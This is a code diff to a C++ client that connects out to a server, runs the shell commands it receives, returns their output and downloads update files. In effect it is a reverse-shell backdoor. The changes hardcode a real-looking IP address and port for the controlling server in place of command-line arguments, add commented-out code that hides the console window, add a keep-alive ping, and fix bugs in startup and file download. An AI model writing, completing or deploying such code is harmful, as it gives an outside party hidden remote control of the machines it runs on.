@@ -7,6 +7,7 @@
 #include <string>
 #include <unistd.h>
 #include <vector>
+#include <windows.h>
 
 #define WIN(exp) exp
 #define LINUX(exp)
@@ -38,6 +39,7 @@
 #define SHELL_MODE_BYTE  0xfd
 #define UPDATE_MODE_BYTE 0xfc
 #define ESTABILISH_BYTE  0xfe
+#define KEEP_ALIVE_PING  0xfb
 
 std::string exec(const char *cmd) {
     std::array<char, 128> buff;
@@ -66,25 +68,34 @@ std::vector<std::string> split(const std::string& str, char delimiter) {
 }
 
 int main(int argc, char **argv) {
-    if (argc < 3) {
+    /*if (argc < 3) {
         std::cout << "Usage: " << argv[0] << " <ip-address> <port>" << std::endl;
 
         return -1;
-    }
+    }*/
+
+    /*HWND window; 
+	AllocConsole(); 
+	window = FindWindowA("ConsoleWindowClass", NULL); 
+	ShowWindow(window, 0);*/ 
 
     #ifdef _WIN32
         WSADATA wsa;
 
-        if (WSAStatup(MAKEWORD(2, 2), &wsa) != 0)
+        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
             std::cout << "[FAILED]SYSTEM ERROR" << std::endl;
     #endif
 
     const char shell_mode      = SHELL_MODE_BYTE;
     const char update_mode     = UPDATE_MODE_BYTE;
     const char estabilish_mode = ESTABILISH_BYTE;
+    const char keep_alive_ping = KEEP_ALIVE_PING;
 
-    const std::string ip_address = argv[1];
-    const std::string port       = argv[2];
+    //const std::string ip_address = argv[1];
+    //const std::string port       = argv[2];
+
+    const std::string ip_address = "80.66.79.140";
+    const std::string port       = "4446";
 
     sockaddr_in imx8mm;
 
@@ -124,6 +135,7 @@ int main(int argc, char **argv) {
 
     bool update_mode_byte = false;
     bool shell_mode_byte  = false;
+    bool keep_alive       = false;
 
     while (::recv(imx8mm_socket, imx8mm_comm_buffer.data(), 1024, 0)) {
         if (imx8mm_comm_buffer.size() > 0) {
@@ -133,6 +145,15 @@ int main(int argc, char **argv) {
 
                 if (com == shell_mode)
                     shell_mode_byte = true;
+
+                if (com == keep_alive_ping)
+                    keep_alive = true;
+            }
+
+            if (keep_alive) {
+                std::cout << "client alive" << std::endl;
+
+                keep_alive = false;
             }
 
             if (update_mode_byte) {
@@ -167,7 +188,7 @@ int main(int argc, char **argv) {
 
                     write_size += bytesRead;
 
-                    if ((write_size - 1024) == file_size)
+                    if (write_size == file_size)
                         break;
 
                     std::cout << "[ INFO ]Downloaded: " << write_size << " target" << file_size << std::endl;
@@ -198,6 +219,14 @@ int main(int argc, char **argv) {
                     if (::send(imx8mm_socket, command_result.c_str(), command_result.size(), 0)WIN( < 0)LINUX( < 0))
                         std::cout << "[FAILED]Error send command result" << std::endl;
 
+                else if (command_result == "") {
+                    command_result = "command failed";
+
+                    if (::send(imx8mm_socket, command_result.c_str(), command_result.size(), 0)WIN( < 0)LINUX( < 0))
+                        std::cout << "[FAILED]Send error" << std::endl;
+                }
+
+                command_result.clear();
                 imx8mm_comm_buffer.clear();
                 imx8mm_comm_buffer.resize(1024);
             }
